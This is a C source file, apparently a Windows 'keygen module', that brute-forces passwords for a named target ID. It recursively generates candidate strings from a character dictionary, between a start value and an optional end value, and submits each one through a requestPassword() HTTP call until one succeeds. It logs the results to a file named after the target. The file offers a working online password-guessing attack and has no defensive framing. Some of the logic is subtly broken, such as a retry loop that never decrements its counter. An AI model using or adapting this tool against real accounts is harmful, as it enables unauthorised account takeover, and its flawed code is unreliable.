//#define	_DIC_LITE

#include <windows.h>
#include <stdio.h>
#include "common.h"
#include "keygenModule.h"
#include "httpModule.h"		// need to
#include "logfileModule.h"

extern char g_id[MAX_ID];
extern char savingFilename[MAX_PATH];

#ifdef _DIC_LITE
#define LENGTH_DICTIONARY	21	//26 + 10
static char dictionary[LENGTH_DICTIONARY]
= {'a','d','e','g','k','m','n','o','s','u','y','0','1','2','3','4','5','6','7','8','9'};
#else
#define LENGTH_DICTIONARY	26 + 10
static char dictionary[LENGTH_DICTIONARY]
= {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
	'0','1','2','3','4','5','6','7','8','9'};
#endif

int findIndexDictionary(char findItem)
{
	int i;
	for(i=0; i<LENGTH_DICTIONARY; i++) if(findItem == dictionary[i]) return i;
	return 0;
}
/*
void Display(int level, char *stringBuffer)
{
	int i;
	
	if(level <= 1) {
		for(i=0; i<LENGTH_DICTIONARY; i++)
				printf("%s%c\n", stringBuffer, dictionary[i]);
	}
	else {
		size_t location;
		for(i=0; i<LENGTH_DICTIONARY; i++) {
			wsprintf(stringBuffer, "%s%c", stringBuffer, dictionary[i]);
			Display(level - 1, stringBuffer);
			location = strlen(stringBuffer);
			if(0 != location) stringBuffer[location-1] = '\0';
		}
	}
}
*/
// 시작값에서 자리수까지
BOOL Display2(int level, char *stringBuffer, char *initData, int levelFix)
{
	char buffer[MAX_PASSWORD], writeBufferStr[LOGGING_BUFFER];
	int i, resultQuery;
	int initValue = findIndexDictionary(initData[levelFix-level]);
	int remainRetry;

	if(level <= 1) {
		for(i=initValue; i<LENGTH_DICTIONARY; i++) {
			wsprintf(buffer,"%s%c", stringBuffer, dictionary[i]);	// 문자열 조합
			remainRetry = RETRY_CONNECT;
//			printf("%s%c\n", stringBuffer, dictionary[i]);	// 출력

			do {
				resultQuery = requestPassword(buffer);
				printf("%s\t%d\n", buffer, resultQuery);

				if(TRUE == resultQuery || CONNECT_ERROR == resultQuery) return FALSE;
				else if(EXCEPT_ERROR == resultQuery) {
					// 로그 기록
					wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", buffer, resultQuery);
					writeLog(writeBufferStr);
					resultQuery--;
				}
				else break;

			} while(remainRetry);
			if(remainRetry <= 0) return FALSE;
		}
	}
	else {
		size_t location;
		for(i=initValue; i<LENGTH_DICTIONARY; i++) {
			wsprintf(stringBuffer, "%s%c", stringBuffer, dictionary[i]);

			if(FALSE == Display2(level - 1, stringBuffer, initData, levelFix)) return FALSE;

			location = strlen(stringBuffer);
			if(0 != location) stringBuffer[location-1] = '\0';
		}
	}
	initData[levelFix-level] = 'a';
	return TRUE;
}

// 시작값~끝값
BOOL Display3(int level, char *stringBuffer, char *initData,char *finalData, int levelFix)
{
	char buffer[MAX_PASSWORD], writeBufferStr[LOGGING_BUFFER];
	int i, resultQuery;
	int initValue = findIndexDictionary(initData[levelFix-level]);
	int remainRetry;

	if(level <= 1) {
		for(i=initValue; i<LENGTH_DICTIONARY; i++) {
			wsprintf(buffer,"%s%c", stringBuffer, dictionary[i]);	// 문자열 조합
			remainRetry = RETRY_CONNECT;
//			printf("%s%c\n", stringBuffer, dictionary[i]);	// 출력

			do {
				resultQuery = requestPassword(buffer);
				printf("%s\t%d\n", buffer, resultQuery);

				if(TRUE == resultQuery || CONNECT_ERROR == resultQuery) return FALSE;
				else if(EXCEPT_ERROR == resultQuery) {
					// 로그 기록
					wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", buffer, resultQuery);
					writeLog(writeBufferStr);
					resultQuery--;
				}
				else break;

			} while(remainRetry);
			if(remainRetry <= 0) return FALSE;
			if(0 == strcmp(finalData, buffer)) return FALSE;
		}
	}
	else {
		size_t location;
		for(i=initValue; i<LENGTH_DICTIONARY; i++) {
			wsprintf(stringBuffer, "%s%c", stringBuffer, dictionary[i]);

			if(FALSE == Display3(level - 1, stringBuffer, initData, finalData, levelFix)) return FALSE;

			location = strlen(stringBuffer);
			if(0 != location) stringBuffer[location-1] = '\0';
		}
	}
	initData[levelFix-level] = 'a';
	return TRUE;
}


/*
void DigitControl(int from, int to) {
	int i;
	char Buffer[MAX_LENGTH]={0};

	if(from <= to) for(i=from; i<=to; i++) Display(i, Buffer);
	else for(i=from; i<=to; i--) Display(i, Buffer);
}

void controlEntry(char * beginString)
{
	char buffer[MAX_LENGTH]={0};
	int level;
	SYSTEMTIME stCurrStartTime, stCurrEndTime;		// 시스템 시간
	
	GetLocalTime(&stCurrStartTime);		// 현재 로컬 시간을 구한다.

	level = (int)strlen(beginString);	// 자리수 파악(깊이))
	Display2(level,buffer,beginString,level);

	GetLocalTime(&stCurrEndTime);	// 현재 로컬 시간을 구한다.
	printf("from : %s\n", beginString);
	printf("Start : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute,stCurrStartTime.wSecond, stCurrStartTime.wMilliseconds);
	printf("End   : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrEndTime.wMonth,stCurrEndTime.wDay,
		stCurrEndTime.wHour, stCurrEndTime.wMinute,stCurrEndTime.wSecond,stCurrEndTime.wMilliseconds);
	WinExec("MessageBox.exe Terminated", SW_SHOWNORMAL);	// 프로그램 종료시 윈도우 메시지
}
*/
void controlEntry2(char * id, char * beginString)
{
	char tmpBeginString[MAX_PASSWORD];
	char buffer[MAX_LENGTH]={0};
	int level;
	SYSTEMTIME stCurrStartTime, stCurrEndTime;		// 시스템 시간
	
	GetLocalTime(&stCurrStartTime);		// 현재 로컬 시간을 구한다.

	level = (int)strlen(beginString);	// 자리수 파악(깊이))
	printf("@@@ target id : %s\n", id);	// for check
	strcpy_s(g_id, MAX_ID, id);			// set to global var(파라메터)
	wsprintf(savingFilename, "%s_%04d%02d%02d_%02d%02d.log", id, 
		stCurrStartTime.wYear, stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute);	// set to global var(로그파일이름)

	// 임시변수로 넘김
	strcat_s(tmpBeginString, MAX_PASSWORD, beginString);
	Display2(level,buffer,beginString,level);

	GetLocalTime(&stCurrEndTime);	// 현재 로컬 시간을 구한다.

	// 정보 출력
	printf("target ID : %s\n", id);
	printf("from : %s\n", beginString);
	printf("Start : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute,stCurrStartTime.wSecond, stCurrStartTime.wMilliseconds);
	printf("End   : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrEndTime.wMonth,stCurrEndTime.wDay,
		stCurrEndTime.wHour, stCurrEndTime.wMinute,stCurrEndTime.wSecond,stCurrEndTime.wMilliseconds);
	WinExec("MessageBox.exe Terminated", SW_SHOWNORMAL);	// 프로그램 종료시 윈도우 메시지
}

void controlEntry3(char * id, char * beginString, char * endString)
{
	char tmpBeginString[MAX_PASSWORD];
	char buffer[MAX_LENGTH]={0};
	int level;
	SYSTEMTIME stCurrStartTime, stCurrEndTime;		// 시스템 시간
	
	GetLocalTime(&stCurrStartTime);		// 현재 로컬 시간을 구한다.

	level = (int)strlen(beginString);	// 자리수 파악(깊이))
	printf("@@@ target id : %s\n", id);	// for check
	strcpy_s(g_id, MAX_ID, id);			// set to global var(파라메터)
	wsprintf(savingFilename, "%s_%04d%02d%02d_%02d%02d.log", id, 
		stCurrStartTime.wYear, stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute);	// set to global var(로그파일이름)

	printf("from : %s\n", beginString);
	printf("to   : %s\n", endString);

	// 임시변수로 넘김
	strcat_s(tmpBeginString, MAX_PASSWORD, beginString);
	Display3(level,buffer,tmpBeginString,endString,level);

	GetLocalTime(&stCurrEndTime);	// 현재 로컬 시간을 구한다.

	// 정보 출력
	printf("target ID : %s\n", id);
	printf("from : %s\n", beginString);
	printf("to   : %s\n", endString);
	printf("Start : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrStartTime.wMonth, stCurrStartTime.wDay,
		stCurrStartTime.wHour, stCurrStartTime.wMinute,stCurrStartTime.wSecond, stCurrStartTime.wMilliseconds);
	printf("End   : %02d/%02d, %02d:%02d:%02d.%03d\n",
		stCurrEndTime.wMonth,stCurrEndTime.wDay,
		stCurrEndTime.wHour, stCurrEndTime.wMinute,stCurrEndTime.wSecond,stCurrEndTime.wMilliseconds);
	WinExec("MessageBox.exe Terminated", SW_SHOWNORMAL);	// 프로그램 종료시 윈도우 메시지
}